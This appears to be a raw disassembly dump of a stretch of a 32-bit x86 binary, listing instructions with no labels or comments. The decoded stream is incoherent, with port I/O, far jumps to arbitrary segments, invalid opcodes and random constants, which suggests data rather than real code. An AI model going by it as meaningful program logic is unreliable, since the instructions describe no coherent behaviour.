  42d918:	pop    esp
  42d919:	cmp    BYTE PTR [edi],ah
  42d91b:	out    0x68,eax
  42d91d:	pop    edx
  42d91e:	shl    cl,1
  42d920:	push   esi
  42d921:	xchg   edi,eax
  42d922:	sbb    BYTE PTR [esi+eax*8],dh
  42d925:	sbb    bh,BYTE PTR [eax+ebx*2+0x55db0672]
  42d92c:	in     eax,0xcc
  42d92e:	shl    BYTE PTR ds:0xcaa5f598,cl
  42d934:	mov    WORD PTR [esi+0x34],ss
  42d937:	mov    eax,0xbc66dd89
  42d93c:	clc    
  42d93d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d93e:	mov    ebx,0x1f450d0f
  42d943:	push   ss
  42d944:	es aas 
  42d946:	cmp    BYTE PTR [edi+0x32],bh
  42d949:	mov    bl,0xbc
  42d94b:	jmp    0xbeae5a57
  42d950:	push   es
  42d951:	popf   
  42d952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d953:	retf   
  42d954:	add    ch,bh
  42d956:	fs xchg edi,eax
  42d958:	rcl    eax,1
  42d95a:	aad    0xf8
  42d95c:	fidiv  DWORD PTR [esi+eax*4]
  42d95f:	aaa    
  42d960:	out    dx,al
  42d961:	adc    al,0x35
  42d963:	jl     0x42d94f
  42d965:	mov    dl,0x43
  42d967:	loop   0x42d9ca
  42d969:	repnz mov DWORD PTR [eax],esp
  42d96c:	jl     0x42d915
  42d96e:	mov    ch,0x40
  42d970:	add    al,0x46
  42d972:	mov    ds:0x3a5cf2a7,al
  42d977:	or     al,0x8b
  42d979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d97a:	pushf  
  42d97b:	in     al,0x47
  42d97d:	clc    
  42d97e:	pushf  
  42d97f:	aaa    
  42d980:	inc    esp
  42d981:	and    eax,0x96fa2a0a
  42d986:	ins    BYTE PTR es:[edi],dx
  42d987:	enter  0xd530,0x41
  42d98b:	call   0x2d5f2384
  42d990:	int    0x71
  42d992:	dec    ebx
  42d993:	rcl    BYTE PTR [edx+0x14],1
  42d996:	xor    al,0x72
  42d998:	scas   al,BYTE PTR es:[edi]
  42d999:	push   esp
  42d99a:	fild   WORD PTR [esi+esi*4]
  42d99d:	test   BYTE PTR [eax-0x5e],0xb6
  42d9a1:	add    bl,BYTE PTR [edi+ecx*4]
  42d9a4:	(bad)
  42d9a8:	fadd   QWORD PTR [edi+0x2]
  42d9ab:	mov    esi,0x6c529a99
  42d9b0:	xor    al,BYTE PTR [eax]
  42d9b2:	scas   eax,DWORD PTR es:[edi]
  42d9b3:	mov    ebx,0x4db4fc16
  42d9b8:	sbb    BYTE PTR [ebp+0x5c],0x17
  42d9bc:	aam    0xcc
  42d9be:	push   edx
  42d9bf:	sbb    ah,BYTE PTR [esi+eiz*4]
  42d9c2:	xlat   BYTE PTR ds:[ebx]
  42d9c3:	dec    ebp
  42d9c4:	adc    al,0xb4
  42d9c6:	add    bh,BYTE PTR [edx]
  42d9c8:	add    eax,DWORD PTR [esi+0xe]
  42d9cb:	imul   BYTE PTR ds:0x2ebad1d5
  42d9d1:	push   ds
  42d9d2:	push   eax
  42d9d3:	mov    WORD PTR [esi+0x21781b10],gs
  42d9d9:	gs push es
  42d9db:	sbb    al,0x4a
  42d9de:	call   0xa14:0x8cbeb28b
  42d9e5:	pop    esi
  42d9e6:	test   BYTE PTR [edi],bl
  42d9e8:	stc    
  42d9e9:	add    BYTE PTR [edx+0x48],dh
  42d9ec:	loope  0x42da60
  42d9ee:	fmul   DWORD PTR [ebx]
  42d9f0:	or     edi,DWORD PTR [ebx+0x240a6b92]
  42d9f6:	push   eax
  42d9f7:	(bad)  [edx]
  42d9f9:	cmp    BYTE PTR [eax+ecx*1],ch
  42d9fc:	add    BYTE PTR [eax-0xe],bh
  42d9ff:	cmp    al,0x19
  42da01:	xlat   BYTE PTR ds:[ebx]
  42da02:	push   ss
  42da03:	(bad)  
  42da04:	mov    bh,0x7
  42da06:	loop   0x42da82
  42da08:	xor    al,0xc0
  42da0a:	retf   
  42da0b:	cmp    ecx,DWORD PTR [edx]
  42da0d:	or     al,0x14
  42da0f:	mov    bh,BYTE PTR [edx+0x78]
  42da12:	jmp    0x5842fddd
  42da17:	les    ebx,FWORD PTR [esi]
  42da19:	fwait
  42da1a:	ins    BYTE PTR es:[edi],dx
  42da1b:	or     DWORD PTR [esi-0x1b],ecx
  42da1e:	data16 or al,0x18
  42da21:	add    eax,0x3deafd14
  42da26:	xchg   ebx,eax
  42da27:	add    BYTE PTR [esi-0x54963d4],dh
  42da2d:	mov    dh,0x3a
  42da2f:	dec    ebp
  42da30:	enter  0xf4d6,0x8b
  42da34:	call   0x1e33:0xa6d9490
  42da3b:	push   edx
  42da3c:	mov    ah,0x46
  42da3e:	stos   DWORD PTR es:[edi],eax
  42da3f:	push   ss
  42da40:	pop    ebp
  42da41:	sbb    BYTE PTR [ebx],bh
  42da43:	nop
  42da44:	sbb    al,0x88
  42da46:	ss int 0xb0
  42da49:	push   0x964d03c
  42da4e:	sbb    ch,BYTE PTR [esi+0x70]
  42da51:	in     al,0xf8
  42da53:	ret    0xd123
  42da56:	dec    ecx
  42da57:	or     DWORD PTR [esp],ebx
  42da5a:	nop/reserved BYTE PTR [edx+0x24ad2b00]
  42da61:	cmc    
  42da62:	sub    esi,ebp
  42da64:	add    eax,0x92051cd1
  42da69:	mov    BYTE PTR [esi+0x5a6aae3f],ch
  42da6f:	mov    ah,0xf0
  42da71:	rcr    dl,cl
  42da73:	sub    al,BYTE PTR [esi]
  42da75:	adc    al,0x24
  42da77:	arpl   di,cx
  42da79:	adc    ecx,edx
  42da7b:	ins    BYTE PTR es:[edi],dx
  42da7c:	sti    
  42da7d:	push   esp
  42da7e:	ss xor al,0x2d
  42da81:	in     eax,dx
  42da82:	cli    
  42da83:	call   0xb5e49705
  42da88:	sbb    BYTE PTR [edx-0x44],0x34
  42da8c:	out    dx,eax
  42da8d:	sbb    al,0x50
  42da8f:	adc    al,0xf0
  42da91:	or     DWORD PTR [edx+0x60],esp
  42da94:	mov    DWORD PTR [edx-0x3ee179eb],ebp
  42da9a:	sub    BYTE PTR [edx],ch
  42da9c:	jmp    0x2c8e:0x1b2547da
  42daa3:	jl     0x42da6b
  42daa5:	or     eax,0x86eaac8c
  42daaa:	loop   0x42dab7
  42daac:	inc    ebp
  42daad:	loope  0x42dac7
  42daaf:	sbb    eax,0xa0a1d00
  42dab4:	imul   ebp,edx,0xffffffb0
  42dab7:	dec    ebp
  42dab8:	add    al,ch
  42daba:	jmp    0xcde2:0x73ea3aa5
  42dac1:	sub    dh,bl
  42dac3:	push   esp
  42dac4:	mov    ebx,DWORD PTR [edx-0x1e]
  42dac7:	adc    BYTE PTR [ebp-0x7a],ah
  42daca:	ret    0xa86c
  42dacd:	out    dx,al
  42dace:	out    0x28,al
  42dad0:	add    BYTE PTR [edx-0x7e],ch
  42dad3:	movlps xmm3,QWORD PTR [ebx]
  42dad6:	jp     0x42daf9
  42dad8:	loop   0x42da78
  42dada:	mov    esp,0x50d0c72
  42dadf:	fwait
  42dae0:	ins    BYTE PTR es:[edi],dx
  42dae1:	xor    al,0x65
  42dae3:	xchg   esi,eax
  42dae4:	push   esp
  42dae5:	push   esi
  42dae6:	in     al,dx
  42dae7:	clc    
  42dae8:	mov    esp,0xd0db3680
  42daed:	push   0xffffff88
  42daef:	push   ss
  42daf0:	sbb    al,0x1e
  42daf2:	push   edx
  42daf3:	es add al,0x44
  42daf6:	fwait
  42daf7:	sub    bh,BYTE PTR [esi]
  42daf9:	sub    al,0xc2
  42dafb:	and    al,0xa0
  42dafd:	in     al,dx
  42dafe:	retf   0xdcdf
  42db01:	adc    al,0x56
  42db03:	sbb    al,0x4b
  42db05:	shr    BYTE PTR [ecx],cl
  42db07:	call   0x286fc974
  42db0c:	push   0xc4f96a17
  42db11:	nop
  42db12:	test   al,0xe7
  42db14:	xchg   edx,eax
  42db15:	(bad)  
  42db16:	and    ah,BYTE PTR [ecx+0x3a478a86]
  42db1c:	sbb    BYTE PTR [edx],bh
  42db1e:	dec    esi
  42db1f:	sbb    bh,BYTE PTR [ebp+0x1]
  42db22:	add    DWORD PTR [esi],edx
  42db24:	mov    BYTE PTR [esi+eiz*2-0x5e],bh
  42db28:	out    0x58,al
  42db2a:	js     0x42dadc
  42db2c:	ror    BYTE PTR [edx+0x3b70343e],1
  42db32:	sar    BYTE PTR [ebx+ebp*1],1
  42db35:	call   0xc88503e4
  42db3a:	inc    eax
  42db3b:	jmp    0xdcf16cc0
  42db40:	and    BYTE PTR [ecx+0x47],0x53
  42db44:	inc    ebp
  42db45:	bound  edx,QWORD PTR [ecx+edx*8+0x467e7e88]
  42db4c:	call   0x287a:0x85436b7d
  42db53:	mov    cl,0x26
  42db55:	lods   eax,DWORD PTR ds:[esi]
  42db56:	adc    eax,0xa0b6fe18
  42db5b:	ret    0x7a69
  42db5e:	sbb    al,0x26
  42db60:	dec    esi
  42db61:	mov    ebp,0xad839afe
  42db66:	push   eax
  42db67:	inc    edx
  42db68:	adc    bl,BYTE PTR [edx-0x2b3b02b9]
  42db6e:	mov    ch,0x60
  42db70:	int    0x44
  42db72:	lea    ecx,[eax]
  42db74:	jns    0x42db98
  42db76:	ret    0xb0eb
  42db79:	into   
  42db7a:	push   esp
  42db7b:	retf   0x7cca
  42db7e:	xchg   ecx,eax
  42db7f:	inc    esi
  42db80:	cli    
  42db81:	sub    eax,0xe51763a2
  42db86:	fidivr WORD PTR [esi+0xfe8f472]
  42db8c:	dec    ebp
  42db8d:	test   BYTE PTR [edx],0xa0
  42db90:	xor    dh,BYTE PTR [ebx+0x40]
  42db93:	mov    al,ds:0x222f2ce6
  42db98:	add    DWORD PTR ds:[eax-0x42],ebp
  42db9c:	sahf   
  42db9d:	mov    al,ds:0x7461e227
  42dba2:	mov    ah,0x4f
  42dba4:	mov    dl,0xbb
  42dba6:	inc    edx
  42dba7:	jbe    0x42dbc3
  42dba9:	ins    BYTE PTR es:[edi],dx
  42dbaa:	mov    esp,0x3f02078e
  42dbaf:	loop   0x42dbd4
  42dbb1:	and    DWORD PTR [esi+0x1d1d88c],edx
  42dbb7:	lds    ecx,FWORD PTR [edx+0x55c476a0]
  42dbbd:	(bad)  
  42dbbe:	cs push ebp
  42dbc0:	(bad)  
  42dbc2:	in     eax,dx
  42dbc3:	and    DWORD PTR [eax-0x67],esi
  42dbc6:	shr    al,1
  42dbc8:	jbe    0x42db84
  42dbca:	ror    BYTE PTR [edx-0x47b349e0],0xbc
  42dbd1:	xchg   ebp,eax
  42dbd2:	lods   al,BYTE PTR ds:[esi]
  42dbd3:	sub    al,0x68
  42dbd5:	add    eax,0xc607825d
  42dbda:	dec    eax
  42dbdb:	xor    al,0x53
  42dbdd:	push   es
  42dbde:	je     0x42dc48
  42dbe0:	cmp    al,BYTE PTR [esp+ebx*4]
  42dbe3:	add    eax,0xd061bc1c
  42dbe8:	popa   
  42dbe9:	push   0x8684ee2b
  42dbee:	inc    eax
  42dbef:	test   al,0xda
  42dbf1:	dec    eax
  42dbf2:	cmp    eax,DWORD PTR [edi+0x6e9baed4]
  42dbf8:	cmp    al,BYTE PTR [eax]
  42dbfa:	adc    edi,eax
  42dbfc:	cmp    eax,0x65be305d
  42dc01:	pop    edi
  42dc02:	jo     0x42db89
  42dc04:	mov    dh,0xca
  42dc06:	addr16 in al,0xd9
  42dc09:	test   eax,0x1c6ea400
  42dc0e:	cmp    DWORD PTR [ecx+0x45],0x27
  42dc12:	cmp    al,0xa0
  42dc14:	inc    esi
  42dc15:	mov    BYTE PTR [eax],0xe8
  42dc18:	inc    eax
  42dc19:	xchg   BYTE PTR [esi+0x1b],dh
  42dc1c:	inc    edi
  42dc1d:	imul   edi,ebp,0x802042fe
  42dc23:	mov    edx,0x2802aed5
  42dc28:	sub    BYTE PTR [esi-0x38d2e5fd],ah
  42dc2e:	inc    edx
  42dc2f:	mov    bl,0xd0
  42dc31:	mov    WORD PTR [edx],fs
  42dc33:	repnz (bad) 
  42dc35:	sbb    al,bl
  42dc37:	(bad)  
  42dc38:	xchg   esi,eax
  42dc39:	push   edx
  42dc3a:	mov    edx,0x923021e8
  42dc3f:	inc    ebp
  42dc40:	add    BYTE PTR [ecx],dh
  42dc42:	mov    esp,0x4d0d6055
  42dc47:	aam    0x5b
  42dc49:	in     al,dx
  42dc4a:	data16 sub BYTE PTR [eax-0x14],cl
  42dc4e:	dec    edx
  42dc4f:	shl    BYTE PTR [esi+0x1c4a38d6],0xc
  42dc56:	jo     0x42dc9e
  42dc58:	jae    0x42dc1a
  42dc5a:	add    DWORD PTR [ecx+0x7c6202e9],esi
  42dc60:	leave  
  42dc61:	in     al,0xa2
  42dc63:	push   edi
  42dc64:	lea    esp,[esi]
  42dc66:	and    al,0x54
  42dc68:	cwde   
  42dc69:	dec    esp
  42dc6a:	jbe    0x42dc86
  42dc6c:	sbb    eax,0x54a9a2ad
  42dc71:	sbb    al,0xb3
  42dc73:	retf   0x40f7
  42dc76:	ss xor al,ah
  42dc79:	push   eax
  42dc7a:	xchg   ebx,eax
  42dc7b:	test   al,0xb2
  42dc7d:	mov    ebp,0x42f89c1c
  42dc82:	dec    ebp
  42dc83:	inc    edi
  42dc84:	sub    DWORD PTR ds:0xbe686f54,0x7730e318
  42dc8e:	lock arpl bp,ax
  42dc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc92:	test   DWORD PTR [esi+eiz*4],ecx
  42dc95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc96:	mov    BYTE PTR [ecx+0x71588885],dl
  42dc9c:	and    BYTE PTR [edx],bl
  42dc9e:	fldenv [ecx+edx*2-0x11]
  42dca2:	mov    eax,ds:0xa65c15a2
  42dca7:	outs   dx,DWORD PTR ds:[esi]
  42dca8:	fidivr WORD PTR [edi]
  42dcaa:	or     al,BYTE PTR [edx-0x18]
  42dcad:	push   esi
  42dcae:	loopne 0x42dcbd
  42dcb0:	ins    BYTE PTR es:[edi],dx
  42dcb1:	and    dh,BYTE PTR [eax]
  42dcb3:	xor    al,0x5e
  42dcb5:	mov    cl,0x2c
  42dcb7:	inc    eax
  42dcb8:	fist   DWORD PTR [eax+0x40]
  42dcbb:	pop    esi
  42dcbc:	inc    ebp
  42dcbd:	aam    0x9c
  42dcbf:	dec    esi
  42dcc0:	cli    
  42dcc1:	jo     0x42dd35
  42dcc3:	mov    ah,0xf6
  42dcc5:	enter  0xb644,0xee
  42dcc9:	jo     0x42dc9c
  42dccb:	mov    cl,ah
  42dccd:	pushf  
  42dcce:	call   0x204d:0x92eaac5a
  42dcd5:	push   es
  42dcd6:	daa    
  42dcd7:	jno    0x42dc63
  42dcd9:	push   ss
  42dcda:	jb     0x42dcee
  42dcdc:	push   eax
  42dcdd:	loopne 0x42dc71
  42dcdf:	xor    dh,dh
  42dce1:	shl    BYTE PTR [esi],1
  42dce3:	push   0xffffff80
  42dce5:	loopne 0x42dcab
  42dce7:	push   0xffffffc9
  42dce9:	je     0x42dcc7
  42dceb:	arpl   bx,si
  42dced:	push   es
  42dcee:	ret    
  42dcef:	ja     0x42dd49
  42dcf1:	out    0xbc,al
  42dcf3:	sbb    al,0x63
  42dcf5:	add    BYTE PTR [ecx-0x25200a37],dh
  42dcfb:	sbb    ch,BYTE PTR [edx+edx*8-0x766d4d70]
  42dd02:	call   0xb1e0:0x30a8e5c1
  42dd09:	or     BYTE PTR [ebp-0x3c],0x4a
  42dd0d:	ret    
  42dd0e:	dec    BYTE PTR [edi+0x5b]
  42dd11:	in     eax,dx
  42dd12:	add    edx,eax
  42dd14:	dec    edi
  42dd15:	or     al,0x29
  42dd17:	push   ecx
  42dd18:	xor    al,0x45
  42dd1a:	call   0x15d0d567
  42dd1f:	pop    ebp
  42dd20:	outs   dx,BYTE PTR ds:[esi]
  42dd21:	xor    DWORD PTR [esi+ebx*8+0x757216ec],ebp
  42dd28:	iret   
  42dd29:	and    BYTE PTR [edx],bh
  42dd2b:	and    BYTE PTR [edx+eiz*1],ah
  42dd2e:	sahf   
  42dd2f:	jb     0x42dd6c
  42dd31:	rcr    ah,1
  42dd33:	push   esp
  42dd34:	mov    edx,DWORD PTR [ebp+0x23]
  42dd37:	pusha  
  42dd38:	push   cs
  42dd39:	retf   0x97ee
  42dd3c:	fcomp  DWORD PTR [edx+0x50]
  42dd3f:	mov    ds:0x9fbed857,al
  42dd44:	xor    al,0x14
  42dd46:	ins    DWORD PTR es:[edi],dx
  42dd47:	xchg   DWORD PTR [ecx+0x73],ebp
  42dd4a:	sub    al,BYTE PTR [eax]
  42dd4c:	pop    edi
  42dd4d:	mov    ebx,0x59842e12
  42dd52:	retf   
  42dd53:	inc    esi
  42dd54:	xor    BYTE PTR [esi-0x3b94db56],al
  42dd5a:	pop    ecx
  42dd5b:	adc    BYTE PTR [eax],bl
  42dd5d:	dec    edi
  42dd5e:	loope  0x42dd7b
  42dd60:	pop    ebp
  42dd61:	cli    
  42dd62:	retf   0xf83d
  42dd65:	ins    DWORD PTR es:[edi],dx
  42dd66:	mov    esi,0x919a04a3
  42dd6b:	adc    al,BYTE PTR [esi]
  42dd6d:	xchg   BYTE PTR [eax],ch
  42dd6f:	mov    cl,0x28
  42dd71:	inc    eax
  42dd72:	mov    eax,ds:0xc0941cdc
  42dd77:	out    dx,al
  42dd78:	cwde   
  42dd79:	inc    ecx
  42dd7a:	push   0xacf6200b
  42dd7f:	inc    ecx
  42dd80:	fimul  WORD PTR [esi-0x5b5e56e8]
  42dd86:	cmp    dh,bl
  42dd88:	bound  ebp,QWORD PTR [edx+0x58]
  42dd8b:	loopne 0x42dd9d
  42dd8d:	mov    edx,0x420aebaa
  42dd92:	repnz sub esp,DWORD PTR [ebx-0x9d7a6e3]
  42dd99:	push   es
  42dd9a:	mov    ch,ch
  42dd9c:	sbb    bh,0x7b
  42dd9f:	mov    ch,0xd
  42dda1:	and    bh,BYTE PTR [eax+0x4b2f026]
  42dda7:	mov    eax,0x1cc42d99
  42ddac:	add    al,0x4
  42ddae:	pop    ebp
  42ddaf:	fcmovb st,st(1)
  42ddb1:	js     0x42de0b
  42ddb3:	push   ss
  42ddb4:	cmp    eax,0x2410d812
  42ddb9:	xor    al,0x16
  42ddbb:	mov    cl,al
  42ddbd:	bound  esp,QWORD PTR [esi]
  42ddbf:	loope  0x42dd47
  42ddc1:	xchg   edi,eax
  42ddc2:	add    al,0xfc
  42ddc4:	mov    ah,0x92
  42ddc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddc7:	push   0x0
  42ddc9:	lahf   
  42ddca:	test   DWORD PTR [edx+0x3126b6b2],edx
  42ddd0:	leave  
  42ddd1:	inc    eax
  42ddd2:	push   eax
  42ddd3:	(bad)  
  42ddd4:	hlt    
  42ddd5:	mov    eax,0x68585356
  42ddda:	into   
  42dddb:	jmp    0xa106:0xf3283a64
  42dde2:	mov    ds:0x595e3039,eax
  42dde7:	push   ds
  42dde8:	fs xchg esi,eax
  42ddea:	shl    DWORD PTR [ebx+0x65260d88],0x32
  42ddf1:	push   cs
  42ddf2:	push   0xffffffe4
  42ddf4:	or     bl,BYTE PTR [edx+0x3ca64163]
  42ddfa:	in     eax,0x11
  42ddfc:	lock xor al,0x6d
  42ddff:	test   cl,al
  42de01:	aam    0x5e
  42de03:	cwde   
  42de04:	fdiv   DWORD PTR [eax-0x64]
  42de07:	sbb    al,0xfe
  42de09:	push   edx
  42de0a:	push   ds
  42de0b:	lods   al,BYTE PTR ds:[esi]
  42de0c:	outs   dx,BYTE PTR ds:[esi]
  42de0d:	pop    eax
  42de0e:	aad    0xa0
  42de10:	mov    eax,ds:0xf027d428
  42de15:	inc    edx
  42de16:	cmp    BYTE PTR [ebp+0x899e1a2],bh
  42de1c:	(bad)  
  42de1d:	aam    0xcc
  42de1f:	pop    esi
  42de20:	scas   eax,DWORD PTR es:[edi]
  42de21:	push   edi
  42de22:	add    BYTE PTR [edi],dh
  42de24:	sub    edi,DWORD PTR [edx-0x5a]
  42de27:	ss sub bl,ch
  42de2a:	shr    DWORD PTR [ebp+ebp*8+0x5a10bdd4],0x93
  42de32:	adc    DWORD PTR [esi+0x79],eax
  42de35:	js     0x42ddd1
  42de37:	xlat   BYTE PTR ds:[ebx]
  42de38:	push   ss
  42de39:	pop    es
  42de3a:	loopne 0x42de14
  42de3c:	stos   BYTE PTR es:[edi],al
  42de3d:	fsubr  st,st(0)
  42de3f:	into   
  42de40:	cld    
  42de41:	mov    eax,0x45bce87c
  42de46:	add    DWORD PTR [ebx+0x4e],0x1036fcc0
  42de4d:	fsub   QWORD PTR [eax-0x6bade220]
  42de53:	xor    al,ah
  42de55:	add    BYTE PTR [ebp-0x52cecf51],dl
  42de5b:	stos   BYTE PTR es:[edi],al
  42de5c:	mov    eax,ds:0xc31eb9
  42de61:	push   cs
  42de62:	or     DWORD PTR [eax-0x23eacf9b],eax
  42de68:	mov    ecx,0x1d50a80f
  42de6d:	test   BYTE PTR [edi-0x547df09c],ah
  42de73:	jb     0x42de1d
  42de75:	or     DWORD PTR [esi+0xe],ebp
  42de78:	jmp    0x6040:0x7594f5d8
  42de7f:	inc    edi
  42de80:	cmp    al,BYTE PTR [esp+edi*1-0x34430bde]
  42de87:	or     al,BYTE PTR [esi-0x79]
  42de8a:	cli    
  42de8b:	shl    DWORD PTR [ecx],cl
  42de8d:	dec    ebx
  42de8e:	dec    ebp
  42de8f:	dec    ebp
  42de90:	lods   eax,DWORD PTR ds:[esi]
  42de91:	xchg   BYTE PTR [edx+edi*8+0x1ca5b236],ch
  42de98:	fild   WORD PTR [ebx-0x61caaf30]
  42de9e:	adc    al,0xa8
  42dea0:	test   al,0xda
  42dea2:	mov    eax,ds:0xe76c2604
  42dea7:	mov    al,0x16
  42dea9:	mov    dl,0xa6
  42deab:	xchg   esi,eax
  42deac:	(bad)  
  42dead:	mov    ebx,0x33bc29
  42deb2:	dec    ebx
  42deb3:	leave  
  42deb4:	call   0xc11c:0x2ed8354d
  42debb:	sbb    al,0x31
  42debd:	pop    ss
  42debe:	jae    0x42de98
  42dec0:	jmp    0x42deba
  42dec2:	push   es
  42dec3:	push   ecx
  42dec4:	lock xchg DWORD PTR [eax],ebp
  42dec7:	push   DWORD PTR [edx-0xd]
  42deca:	sbb    BYTE PTR [edx+ecx*1+0x5b],0x53
  42decf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ded0:	cs shl edx,cl
  42ded3:	push   ds
  42ded4:	stos   DWORD PTR es:[edi],eax
  42ded5:	cmp    al,0x82
  42ded7:	push   esi
  42ded8:	or     DWORD PTR [ebp+0x75],esi
  42dedb:	ins    BYTE PTR es:[edi],dx
  42dedc:	cmp    esp,DWORD PTR [eax]
  42dede:	in     eax,dx
  42dedf:	data16 stc 
  42dee1:	fs mov al,0x8a
  42dee4:	or     bh,BYTE PTR es:[eax-0x5f2bddb3]
  42deeb:	add    DWORD PTR [ebp+0xd],esi
  42deee:	sub    al,0x54
  42def0:	jbe    0x42df27
  42def2:	pusha  
  42def3:	dec    eax
  42def4:	adc    al,0xb2
  42def6:	mov    dh,0x8e
  42def8:	add    al,BYTE PTR [esi+edi*1-0x3ecb2f58]
  42deff:	lods   al,BYTE PTR ds:[esi]
  42df00:	push   esi
  42df01:	je     0x42df4f
  42df03:	cmp    al,0x12
  42df05:	bound  edi,QWORD PTR [ecx+0x1e]
  42df08:	inc    edx
  42df09:	enter  0x1cb4,0xa1
  42df0d:	mov    ds:0xe2cd8089,eax
  42df12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df14:	mov    BYTE PTR [edi],0x30
  42df17:	xchg   ecx,eax
  42df18:	push   0x14c4e86e
  42df1d:	nop
  42df1e:	xor    eax,0x58a82889
  42df23:	dec    ecx
  42df24:	dec    eax
  42df25:	inc    esi
  42df26:	sub    BYTE PTR [ecx+0x4f587616],bl
  42df2c:	loop   0x42dee6
  42df2e:	dec    edx
  42df2f:	xor    ebp,DWORD PTR [edx+0x16fd9a90]
  42df35:	ret    
  42df36:	adc    ebx,DWORD PTR [eax+0x4]
  42df39:	xor    ah,al
  42df3b:	lods   al,BYTE PTR ds:[esi]
  42df3d:	lods   eax,DWORD PTR ds:[esi]
  42df3e:	jmp    0x2ef5f3d4
  42df43:	pop    ebx
  42df44:	mov    esi,0x80b113d4
  42df49:	inc    esi
  42df4a:	mov    cr5,eax
  42df4d:	jnp    0x42ded6
  42df4f:	pop    ebx
  42df50:	ficom  DWORD PTR [edi-0x2d]
  42df53:	fwait
  42df54:	pop    ebx
  42df55:	test   BYTE PTR [eax-0x15d8ff84],0xb7
  42df5c:	add    BYTE PTR [edi],ch
  42df5e:	jbe    0x42df0c
  42df60:	mov    WORD PTR [ebx-0x7a],cs
  42df63:	imul   eax,DWORD PTR [edi-0x27],0x10d93cb4
  42df6a:	cmp    ch,BYTE PTR [ebx+ebp*2+0x66721087]
  42df71:	mov    ah,0xe6
  42df73:	jne    0x42dfcd
  42df75:	dec    esi
  42df76:	fist   DWORD PTR [eax]
  42df78:	adc    al,0x4
  42df7a:	call   0xa268:0x581a9b6a
  42df81:	inc    esp
  42df82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df83:	pop    edx
  42df84:	mov    esp,0x7c1555b1
  42df89:	and    BYTE PTR [ecx+0x4d24b92a],ch
  42df8f:	push   edx
  42df90:	(bad)  
  42df92:	adc    al,0x12
  42df94:	push   cs
  42df95:	dec    ebx
  42df96:	adc    BYTE PTR [eax-0x27a93606],cl
  42df9c:	test   BYTE PTR [ecx],0xfc
  42df9f:	ret    0x430a
  42dfa2:	pop    esi
  42dfa3:	call   0x4788:0x15398552
  42dfaa:	push   ss
  42dfab:	mov    esi,0x9ae2fafe
  42dfb0:	mov    edi,0x71f6ede8
  42dfb5:	push   edx
  42dfb6:	sub    eax,0x981cfa00
  42dfbb:	pop    eax
  42dfbc:	add    BYTE PTR ds:0x2433009b,al
  42dfc2:	mov    ds:0x1848a960,eax
  42dfc7:	sahf   
  42dfc8:	clc    
  42dfc9:	lods   eax,DWORD PTR ds:[esi]
  42dfca:	mov    ds:0x1b2e50c2,eax
  42dfcf:	out    0x28,al
  42dfd1:	inc    ecx
  42dfd2:	in     al,0x46
  42dfd4:	push   0x70
  42dfd6:	stos   BYTE PTR es:[edi],al
  42dfd7:	add    BYTE PTR [ebx-0x4d],bl
  42dfda:	xor    BYTE PTR [eax+0x5e],dh
  42dfdd:	mov    ecx,0x46bf3540
  42dfe2:	mov    DWORD PTR [ebx+0x68],ebp
  42dfe5:	inc    ecx
  42dfe6:	xchg   ebp,eax
  42dfe7:	nop
  42dfe8:	jb     0x42dffa
  42dfea:	js     0x42df94
  42dfec:	pusha  
  42dfed:	clc    
  42dfee:	or     BYTE PTR [esi-0x490d5d76],0xf
  42dff5:	inc    eax
  42dff6:	xor    dh,BYTE PTR [eax+eiz*4-0x20aaaa0a]
  42dffd:	ror    BYTE PTR [edx],0x4b
  42e000:	push   esi
  42e001:	jae    0x42e07b
  42e003:	xlat   BYTE PTR ds:[ebx]
  42e004:	int3   
  42e005:	jne    0x42e03b
  42e007:	push   eax
  42e008:	scas   al,BYTE PTR es:[edi]
  42e009:	sbb    eax,0x6e071a06
  42e00e:	lods   al,BYTE PTR ds:[esi]
  42e00f:	js     0x42e037
  42e011:	fsubr  QWORD PTR [edx+0x12]
  42e014:	jb     0x42e056
  42e016:	dec    esp
  42e017:	imul   BYTE PTR [ebx+0x58]
  42e01a:	fs aad 0x4a
  42e01d:	sbb    DWORD PTR [edx+ebx*8+0x25],ecx
  42e021:	popf   
  42e022:	xor    cl,0xa6
  42e025:	rcl    BYTE PTR [esi+0x19],1
  42e028:	ss loop 0x42e0a4
  42e02b:	mov    dh,0xa4
  42e02d:	jle    0x42dfce
  42e02f:	dec    edi
  42e030:	xchg   esp,eax
  42e031:	int    0x14
  42e033:	pop    edx
  42e034:	mov    eax,0x6cf1da96
  42e039:	popf   
  42e03a:	cmp    ch,BYTE PTR [edx+0xd722d3e]
  42e040:	pushf  
  42e041:	aad    0x72
  42e043:	push   ds
  42e044:	ss cmp al,0x52
  42e047:	mov    ebp,DWORD PTR [eax+ebx*1]
  42e04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e04b:	outs   dx,BYTE PTR ds:[esi]
  42e04c:	call   0x86aba137
  42e051:	dec    ecx
  42e052:	call   0x81e0eb2c
  42e057:	lods   eax,DWORD PTR ds:[esi]
  42e058:	inc    esp
  42e059:	sub    ebx,DWORD PTR [edx]
  42e05b:	or     dl,ah
  42e05d:	dec    esi
  42e05e:	fidiv  WORD PTR [ecx+0xe]
  42e061:	adc    esp,DWORD PTR [ebx+ecx*1+0x34]
  42e065:	adc    DWORD PTR ds:0xe500e61d,eax
  42e06b:	stc    
  42e06c:	mov    BYTE PTR ss:[edi+esi*1+0x6c],dl
  42e071:	adc    BYTE PTR [ecx+0x2a],cl
  42e074:	scas   al,BYTE PTR es:[edi]
  42e075:	adc    al,0x80
  42e077:	test   eax,0x694d84b5
  42e07c:	rcr    BYTE PTR [esi-0x4f09f7f6],0xd6
  42e083:	bound  ebp,QWORD PTR [eax-0x34]
  42e086:	or     dh,dl
  42e088:	jl     0x42e0d6
  42e08a:	cmp    eax,0x4a075b42
  42e08f:	ss cli 
  42e091:	les    eax,FWORD PTR [ebp-0x18]
  42e094:	aam    0x4a
  42e096:	adc    ebp,DWORD PTR [ebp+0x727722a3]
  42e09c:	retf   0xd8ac
  42e09f:	scas   al,BYTE PTR es:[edi]
